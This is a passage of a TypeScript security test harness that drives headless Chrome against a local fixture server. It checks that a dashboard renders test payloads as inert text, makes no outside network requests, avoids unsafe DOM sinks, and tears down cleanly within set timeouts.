      timersBefore: refusedTimersBefore,
      timersAfter: refusedTimers,
      listeners: refusedListeners,
    }),
  );

  // The other end of the same readiness state: a page target that never
  // registers must reach the deadline as the content-free debugger_target
  // timeout, not as a decided payload fault and not as a raw error. Injected
  // deadline, for the reason above.
  const neverRegisters = await probeDebuggerBody("[]", { deadlineMs: NEVER_READY_DEADLINE_MS });
  check(
    "debugger_target_list_without_a_page_target_rejects_at_deadline_content_free_without_leaks",
    neverRegisters.isTimeoutError &&
      neverRegisters.message === "proof_timeout:debugger_target" &&
      !neverRegisters.message.includes(String(neverRegisters.port)) &&
      !neverRegisters.message.includes("127.0.0.1") &&
      !neverRegisters.message.includes("json") &&
      neverRegisters.attempts > 1 &&
      neverRegisters.requests > 1 &&
      neverRegisters.elapsedMs >= NEVER_READY_DEADLINE_MS &&
      neverRegisters.elapsedMs < NEVER_READY_DEADLINE_MS + ABORT_SETTLE_MS &&
      neverRegisters.timersAfter <= neverRegisters.timersBefore &&
      neverRegisters.listeners === 0 &&
      neverRegisters.serverClosed,
    JSON.stringify({
      error: neverRegisters.message,
      requests: neverRegisters.requests,
      attempts: neverRegisters.attempts,
      elapsedMs: neverRegisters.elapsedMs,
      deadlineMs: NEVER_READY_DEADLINE_MS,
      shippedDeadlineMs: DEBUGGER_TARGET_MS,
      timersBefore: neverRegisters.timersBefore,
      timersAfter: neverRegisters.timersAfter,
      listeners: neverRegisters.listeners,
      serverClosed: neverRegisters.serverClosed,
    }),
  );

  // A decided-bad payload and an expired deadline must not arrive at the
  // process surface as the same string.
  check(
    "debugger_target_payload_fault_and_deadline_expiry_surface_different_messages",
    prose.message !== deadlineMessage &&
      wrongShapes.every(({ probe }) => probe.message !== deadlineMessage) &&
      prose.message === "proof_timeout:debugger_target:payload" &&
      deadlineMessage === "proof_timeout:debugger_target" &&
      refusedMessage === "proof_timeout:debugger_target",
    JSON.stringify({
      payloadMessage: prose.message,
      wrongShapeMessages: wrongShapes.map(({ probe }) => probe.message),
      deadlineMessage,
      refusedMessage,
      differ: prose.message !== deadlineMessage,
    }),
  );

  const refusingReleased = await refusing.release();
  const bindAfterRelease = await bindOutcome(refusing.port);
  check(
    "debugger_target_refusing_port_held_against_a_competing_bind_and_released_after",
    bindWhileHeld === "EADDRINUSE" &&
      refusingReleased &&
      bindAfterRelease === "bound",
    JSON.stringify({
      bindWhileHeld,
      released: refusingReleased,
      bindAfterRelease,
      deadlineElapsedMs,
    }),
  );
}

async function evaluate<T>(
  cdp: CdpClient,
  expression: string,
  awaitPromise = false,
  signal?: AbortSignal,
): Promise<T> {
  const result = await cdp.send<{
    result?: { value?: T; description?: string };
    exceptionDetails?: { text?: string; exception?: { description?: string } };
  }>("Runtime.evaluate", { expression, awaitPromise, returnByValue: true }, { signal });
  if (result.exceptionDetails) throw new Error(result.exceptionDetails.exception?.description ?? result.exceptionDetails.text ?? "evaluation failed");
  return result.result?.value as T;
}

async function waitForDashboardReady(
  cdp: CdpClient,
  marker: string,
  signal: AbortSignal,
  gate: LoaderGenerationGate,
) {
  const receipt = await waitForDomText({
    probe: async () => {
      const status = await evaluate<string>(cdp, domTextReadinessExpression(marker), false, signal);
      if (status !== "missing" && status !== "mounted" && status !== "ready") {
        throw new Error("readiness_probe_unexpected_status");
      }
      return status;
    },
    delay: (ms) => abortableDelay(ms, signal),
    now: () => Date.now(),
    signal,
    generationCommitted: () => gate.isGenerationCommitted(),
    abortError: () => new ProofTimeoutError("browser_proof_overall"),
  }, { timeoutMs: DASHBOARD_READY_MS, pollMs: 50 });
  if (!receiptIsContentFree(receipt)) throw new Error("readiness_receipt_leaked_content");
  return receipt;
}

function startFixtureServer(html: string, mutations: Array<{ route: string; body: unknown }>) {
  const headers = securityHeaders(html);
  const server = http.createServer((request, response) => {
    const url = new URL(request.url ?? "/", "http://127.0.0.1");
    if (request.method === "GET" && (url.pathname === "/" || url.pathname === "/index.html")) {
      response.writeHead(200, headers);response.end(html);return;
    }
    if (request.method === "POST" && url.pathname.startsWith("/api/settings/")) {
      const chunks: Buffer[] = [];
      request.on("data", (chunk) => chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk)));
      request.on("end", () => {
        let body: unknown = null;
        try { body = JSON.parse(Buffer.concat(chunks).toString("utf8") || "null") } catch { body = "invalid_json" }
        mutations.push({ route: url.pathname, body });
        response.writeHead(200, { "content-type": "application/json", "x-content-type-options": "nosniff" });
        response.end('{"ok":true}');
      });
      return;
    }
    const fixtures: Record<string, unknown> = {
      "/api/snapshot": snapshotFixture,
      "/api/settings": settingsFixture,
      "/api/session": sessionFixture,
      "/api/repo": repoFixture,
    };
    if (url.pathname in fixtures) {
      response.writeHead(200, { "content-type": "application/json", "x-content-type-options": "nosniff" });
      response.end(JSON.stringify(fixtures[url.pathname]));return;
    }
    response.writeHead(404, { "content-type": "application/json", "x-content-type-options": "nosniff" });response.end('{"error":"not_found"}');
  });
  return server;
}

async function browserProof(html: string) {
  if (!fs.existsSync(chromePath)) throw new Error(`Chrome unavailable at ${chromePath}`);
  const mutations: Array<{ route: string; body: unknown }> = [];
  const fixtureServer = startFixtureServer(html, mutations);
  await new Promise<void>((resolve, reject) => {
    fixtureServer.once("error", reject);fixtureServer.listen(0, "127.0.0.1", resolve);
  });
  const base = `http://127.0.0.1:${(fixtureServer.address() as AddressInfo).port}`;
  const profile = fs.mkdtempSync(path.join(os.tmpdir(), "plimsoll-dashboard-chrome-"));
  const chrome = spawn(chromePath, [
    "--headless=new",
    "--no-first-run",
    "--disable-background-networking",
    "--disable-component-update",
    "--disable-default-apps",
    "--disable-sync",
    "--metrics-recording-only",
    // This synthetic profile must not wait on the macOS user's login keychain.
    "--use-mock-keychain",
    "--remote-debugging-port=0",
    `--user-data-dir=${profile}`,
    "about:blank",
  ], { stdio: "ignore" });
  const controller = new AbortController();
  let cdp: CdpClient | undefined;
  let shutdownReceipt: Awaited<ReturnType<typeof shutdownBrowser>> | undefined;
  let serverClosed = false;
  let cleanupPromise: Promise<void> | undefined;
  const cleanup = () => cleanupPromise ??= (async () => {
    controller.abort();
    try {
      shutdownReceipt = await shutdownBrowser(cdp, chrome);
    } finally {
      serverClosed = await closeFixtureServer(fixtureServer);
      fs.rmSync(profile, { recursive: true, force: true });
    }
  })();
  const operation = (async () => {
    const activePort = path.join(profile, "DevToolsActivePort");
    await waitForFile(activePort, chrome, controller.signal);
    const [debugPort] = fs.readFileSync(activePort, "utf8").split("\n");
    // The interval DEBUGGER_TARGET_MS actually governs, emitted from a finally
    // so the run that expires the deadline prints it too. Numbers only, so
    // hosted runs accumulate the distribution that record is still missing
    // from their failures as well as from their successes; the rejection
    // carries the same two numbers to the process surface.
    const readinessStartedAt = Date.now();
    let debuggerAttempts = 0;
    let debuggerResolved = false;
    const page = await (async () => {
      try {
        const target = await fetchDebuggerPageTarget(
          `http://127.0.0.1:${debugPort}/json/list`,
          controller.signal,
          { onAttempts: (attempts) => { debuggerAttempts = attempts } },
        );
        debuggerResolved = true;
        return target;
      } finally {
        const debuggerReadyMs = Date.now() - readinessStartedAt;
        check(
          "browser_debugger_target_readiness_receipt_present_and_numeric",
          Number.isFinite(debuggerReadyMs) &&
            debuggerReadyMs >= 0 &&
            Number.isInteger(debuggerAttempts) &&
            debuggerAttempts >= 1 &&
            (!debuggerResolved || debuggerReadyMs < DEBUGGER_TARGET_MS),
          JSON.stringify({
            devtoolsActivePortToTargetsMs: debuggerReadyMs,
            attempts: debuggerAttempts,
            resolved: debuggerResolved,
            deadlineMs: DEBUGGER_TARGET_MS,
          }),
        );
      }
    })();
    cdp = await CdpClient.connect(page.webSocketDebuggerUrl, { signal: controller.signal });
    const pageErrors: string[] = [],consoleErrors: string[] = [],requests: string[] = [];
    cdp.on("Runtime.exceptionThrown", (params) => pageErrors.push(JSON.stringify(params)));
    cdp.on("Runtime.consoleAPICalled", (params) => { if (params.type === "error" || params.type === "assert") consoleErrors.push(JSON.stringify(params)) });
    cdp.on("Log.entryAdded", (params) => {
      const entry = params.entry as { level?: string; text?: string } | undefined;
      if (entry?.level === "error") consoleErrors.push(entry.text ?? JSON.stringify(entry));
    });
    cdp.on("Network.requestWillBeSent", (params) => {
      const request = params.request as { url?: string } | undefined;if (request?.url) requests.push(request.url);
    });
    await Promise.all([cdp.send("Page.enable"), cdp.send("Runtime.enable"), cdp.send("Network.enable"), cdp.send("Log.enable")]);
    const navigationGate = new LoaderGenerationGate();
    cdp.on("Page.frameNavigated", (params) => {
      const frame = params.frame as { id?: string; loaderId?: string } | undefined;
      if (frame?.id) navigationGate.observe(frame.id, frame.loaderId ?? "");
    });

    const observations: string[] = [];
    for (const viewport of [{ name: "desktop", width: 1280, height: 900, mobile: false }, { name: "mobile", width: 390, height: 844, mobile: true }]) {
      await cdp.send("Emulation.setDeviceMetricsOverride", { width: viewport.width, height: viewport.height, deviceScaleFactor: 1, mobile: viewport.mobile });
      const navigation = await cdp.send<{ frameId?: string; loaderId?: string }>("Page.navigate", { url: `${base}/` });
      if (!navigation.frameId || !navigation.loaderId) throw new Error("navigation_generation_unavailable");
      navigationGate.arm(navigation.frameId, navigation.loaderId);
      const readiness = await waitForDashboardReady(cdp, payloads.html, controller.signal, navigationGate);
      if (!readiness.ok) throw new ProofTimeoutError("dashboard_readiness", readiness.detail);
      check(
        `browser_${viewport.name}_readiness_bounded_content_free`,
        readiness.ok && readiness.elapsedMs <= DASHBOARD_READY_MS && receiptIsContentFree(readiness),
        JSON.stringify(readiness),
      );
      observations.push(await evaluate<string>(cdp, "document.body.textContent"));
      await evaluate(cdp, `openSession(${JSON.stringify(snapshotFixture.sessions[0].sessionId)})`, true);
      observations.push(await evaluate<string>(cdp, "document.querySelector('#d-body').textContent"));
      await evaluate(cdp, `openRepo(${JSON.stringify(snapshotFixture.repos[0].repoHash)})`, true);
      observations.push(await evaluate<string>(cdp, "document.querySelector('#d-body').textContent"));
      await evaluate(cdp, "loadSettings()", true);
      observations.push(await evaluate<string>(cdp, `document.querySelector('#settings').textContent + [...document.querySelectorAll('#settings input, #settings option')].map(element=>element.value).join(' ')`));
      await evaluate(cdp, `(async()=>{
        const inputs=[...document.querySelectorAll('#s-accounts input')];
        inputs[0].value=${JSON.stringify(payloads.unicode)};
        inputs[1].value='browser-proof@example.invalid';
        await saveAccountRow('sha256:securityproofaccount',inputs[0],inputs[1]);
        await mergeAccount('sha256:securityproofaccount','sha256:securityproofcanonical');
        await removePrio(${JSON.stringify(payloads.url)});
        await removeSub(0);
        return true;
      })()`, true);
      await evaluate(cdp, `window.__plimsollDashboardTest.drawerError('fixture',new Error(${JSON.stringify(payloads.unicode)}))`);
      observations.push(await evaluate<string>(cdp, "document.querySelector('#d-body').textContent"));
      const domAudit = await evaluate<{
        handlers: number; urlAttributes: number; activeNodes: number; interactiveRows: number; dialogs: number; testHook: boolean; viewport: number;
      }>(cdp, `({
        handlers:document.querySelectorAll('[onclick],[onchange],[onerror],[onload],[onfocus],[onbegin]').length,
        urlAttributes:document.querySelectorAll('[src],[href],[srcdoc]').length,
        activeNodes:document.querySelectorAll('iframe,object,embed,img,link,base,form').length,
        interactiveRows:document.querySelectorAll('tr.row[tabindex="0"]').length,
        dialogs:document.querySelectorAll('[role="dialog"][aria-modal="true"]').length,
        testHook:Boolean(window.__plimsollDashboardTest),
        viewport:document.documentElement.clientWidth
      })`);
      check(
        `browser_${viewport.name}_dom_inert`,
        domAudit.handlers === 0 &&
          domAudit.urlAttributes === 0 &&
          domAudit.activeNodes === 0 &&
          domAudit.interactiveRows >= 2 &&
          domAudit.dialogs === 2 &&
          domAudit.testHook &&
          domAudit.viewport <= viewport.width &&
          domAudit.viewport >= viewport.width - 20,
        JSON.stringify(domAudit),
      );
    }
    const observed = observations.join("\n");
    check(
      "browser_payloads_render_as_text",
      Object.values(payloads).every((payload) => observed.includes(payload)),
      JSON.stringify(Object.fromEntries(Object.entries(payloads).map(([name, payload]) => [name, observed.includes(payload)]))),
    );
    const outsideRequests = requests.filter((url) => !url.startsWith(base));
    check("browser_zero_network_exfiltration", requests.length >= 8 && outsideRequests.length === 0, JSON.stringify({ requests: requests.length, outsideRequests }));
    const mutationRoutes = new Set(mutations.map((entry) => entry.route));
    check(
      "browser_settings_edits_preserved",
      ["/api/settings/account-label", "/api/settings/account-email", "/api/settings/account-merge", "/api/settings/priority", "/api/settings/subscriptions"]
        .every((route) => mutationRoutes.has(route)),
      JSON.stringify({ requests: mutations.length, routes: [...mutationRoutes] }),
    );
    check("browser_zero_page_console_errors", pageErrors.length === 0 && consoleErrors.length === 0, JSON.stringify({ pageErrors, consoleErrors }));
  })();
  try {
    await runWithBrowserWatchdog({
      operation,
      controller,
      cleanup,
      timeoutMs: BROWSER_PROOF_WALL_MS,
    });
  } catch (error) {
    try { await cleanup(); }
    catch { console.error(JSON.stringify({ proof: "dashboard-security", error: "browser_teardown_failed" })); }
    throw error;
  }
  await cleanup();
  check(
    "browser_process_bounded_teardown",
    shutdownReceipt?.exited === true &&
      shutdownReceipt.durationMs <= BROWSER_PROTOCOL_CLOSE_MS * 2 + BROWSER_SIGNAL_GRACE_MS * 2 + 500 &&
      childHasExited(chrome) &&
      !fs.existsSync(profile) &&
      cdp?.pendingCount === 0 &&
      serverClosed,
    JSON.stringify({
      shutdownReceipt,
      processExited: childHasExited(chrome),
      profileRemoved: !fs.existsSync(profile),
      pendingCommands: cdp?.pendingCount ?? 0,
      serverClosed,
    }),
  );
}

async function main() {
  if (process.env.PLIMSOLL_DASHBOARD_TIMEOUT_EXIT_FIXTURE === "1") {
    const fixtureRoot = process.env.PLIMSOLL_DASHBOARD_TIMEOUT_FIXTURE_ROOT;
    if (!fixtureRoot || !fs.existsSync(fixtureRoot)) throw new Error("timeout_fixture_root_missing");
    const scenario = await runNeverResolvingCdpScenario(fixtureRoot);
    if (scenario.timeoutError instanceof ProofTimeoutError) throw scenario.timeoutError;
    throw new Error("timeout_fixture_did_not_timeout");
  }
  const html = fs.readFileSync(dashboardPath, "utf8"),script = inlineBlock(html, "script");
  const forbidden = [
    ["innerHTML", /\binnerHTML\b/], ["outerHTML", /\bouterHTML\b/], ["insertAdjacentHTML", /\binsertAdjacentHTML\b/],
    ["document.write", /document\.write/], ["inline handler", /\son[a-z]+\s*=/i], ["style attribute", /\sstyle\s*=/i],
    ["style property", /\.style\s*[.=]/], ["eval", /\beval\s*\(/], ["Function constructor", /\bnew\s+Function\b/],
    ["URL-bearing markup", /\s(?:src|href|srcdoc|xlink:href)\s*=/i],
  ] as const;
  const hits = forbidden.filter(([, pattern]) => pattern.test(html)).map(([name]) => name);
  check("static_forbidden_sinks_absent", hits.length === 0, JSON.stringify({ hits }));
  let parseError: string | null = null;
  try { new Function(script); } catch (error) { parseError = String(error) }
  check("dashboard_script_parses", script.length > 5_000 && parseError === null, parseError ?? `script bytes=${Buffer.byteLength(script)}`);
  check(
    "safe_dom_layer_present",
    html.includes("textContent") && html.includes("createElement") && html.includes("createElementNS") && html.includes("addEventListener") && html.includes("replaceChildren"),
    "textContent/createElement/createElementNS/addEventListener/replaceChildren",
  );
  await proveBoundedSignalEscalation();
  await proveNeverResolvingCdpCleanup();
  await proveDebuggerTargetRetry();
  proveTimeoutExitSurface();
  await actualServerHeaderProof();
  await browserProof(html);
  const failed = checks.filter((receipt) => !receipt.passed);
  console.log(JSON.stringify({ proof: "dashboard-security", checks: checks.length, passed: checks.length - failed.length, failed: failed.map((receipt) => receipt.name) }));
  if (failed.length) process.exitCode = 1;
}

if (process.argv[1] && path.resolve(process.argv[1]) === scriptPath) main().catch((error) => {
  if (error instanceof ProofTimeoutError) {
    const stageDetail = error.message.split(":")[2];
    console.error(JSON.stringify({
      proof: "dashboard-security",
      error: "proof_timeout",
      stage: error.stage,
      ...(stageDetail ? { detail: stageDetail } : {}),
      ...(error.elapsedMs !== undefined ? { elapsedMs: error.elapsedMs } : {}),
      ...(error.attempts !== undefined ? { attempts: error.attempts } : {}),
    }));
  } else {
    console.error(error instanceof Error ? error.stack : String(error));
  }
  process.exitCode = 1;
});
